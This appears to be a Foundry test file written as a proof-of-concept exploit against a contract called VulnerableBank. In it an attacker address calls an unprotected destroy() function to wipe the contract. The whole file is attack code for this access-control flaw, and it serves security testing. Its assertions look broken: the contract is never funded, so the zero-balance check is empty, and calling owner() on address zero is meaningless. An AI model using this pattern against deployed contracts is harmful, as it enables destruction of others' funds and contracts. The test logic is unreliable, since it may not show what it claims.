// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./basetest.sol";
import "../src/5efeb9b3-7ea9-49ce-abf9-e297992d533f_VulnerableBank.sol";

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new VulnerableBank();
        vm.deal(attacker, 10 ether);
    }

    function testExploit() public balanceLog {
        // Trigger the destroy() function using a public transaction from the attacker
        vm.prank(attacker);
        target.destroy();

        // Assert that the contract is destroyed
        assertEq(address(target).balance, 0);
        assertEq(VulnerableBank(address(0)).owner(), address(0));
    }
}